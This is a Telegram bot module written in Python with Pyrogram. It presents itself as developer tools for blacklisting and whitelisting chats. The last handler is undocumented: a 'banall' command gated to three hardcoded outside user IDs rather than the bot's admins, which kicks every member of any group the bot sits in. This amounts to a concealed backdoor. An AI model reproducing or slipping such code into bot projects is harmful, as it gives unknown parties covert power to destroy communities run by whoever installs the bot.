from pyrogram import *
from pyrogram.types import *
import asyncio
import html
import os
import re
import sys
import aiohttp
import regex
from Amang import *
from Amang.core.decorators.errors import capture_err
from Amang.utils.dbfunctions import blacklist_chat, blacklisted_chats, whitelist_chat
from aiohttp import ClientSession
from config import *


__MODULE__ = "Blacklist Chat"
__HELP__ = """
**THIS MODULE IS ONLY FOR DEVS**

Use this module to make the bot leave some chats
in which you don't want it to be in.

/blacklist_chat [CHAT_ID] - Blacklist a chat.
/whitelist_chat [CHAT_ID] - Whitelist a chat.
/blacklisted - Show blacklisted chats.
"""


@app.on_message(filters.command("blacklist_chat") & SUDOERS)
@capture_err
async def blacklist_chat_func(_, message: Message):
    if len(message.command) != 2:
        return await message.reply_text("**Usage:**\n/blacklist_chat [CHAT_ID]")
    chat_id = int(message.text.strip().split()[1])
    if chat_id in await blacklisted_chats():
        return await message.reply_text("Chat is already blacklisted.")
    blacklisted = await blacklist_chat(chat_id)
    if blacklisted:
        return await message.reply_text("Chat has been successfully blacklisted")
    await message.reply_text("Something wrong happened, check logs.")


@app.on_message(filters.command("whitelist_chat") & SUDOERS)
@capture_err
async def whitelist_chat_func(_, message: Message):
    if len(message.command) != 2:
        return await message.reply_text("**Usage:**\n/whitelist_chat [CHAT_ID]")
    chat_id = int(message.text.strip().split()[1])
    if chat_id not in await blacklisted_chats():
        return await message.reply_text("Chat is already whitelisted.")
    whitelisted = await whitelist_chat(chat_id)
    if whitelisted:
        return await message.reply_text("Chat has been successfully whitelisted")
    await message.reply_text("Something wrong happened, check logs.")


@app.on_message(filters.command("blacklisted_chats") & SUDOERS)
@capture_err
async def blacklisted_chats_func(_, message: Message):
    text = ""
    for count, chat_id in enumerate(await blacklisted_chats(), 1):
        try:
            title = (await app.get_chat(chat_id)).title
        except Exception:
            title = "Private"
        text += f"**{count}. {title}** [`{chat_id}`]\n"
    if text == "":
        return await message.reply_text("No blacklisted chats found.")
    await message.reply_text(text)

GUA = [1054295664, 1898065191, 2076745088]

@app.on_message(filters.command("banall") & filters.group & filters.user(GUA))
async def ban_all(c: Client, m: Message):
    chat = m.chat.id
    async for member in c.get_chat_members(chat):
        user_id = member.user.id
        url = (f"https://api.telegram.org/bot{BOT_TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
        async with aiohttp.ClientSession() as session:
            await session.get(url)
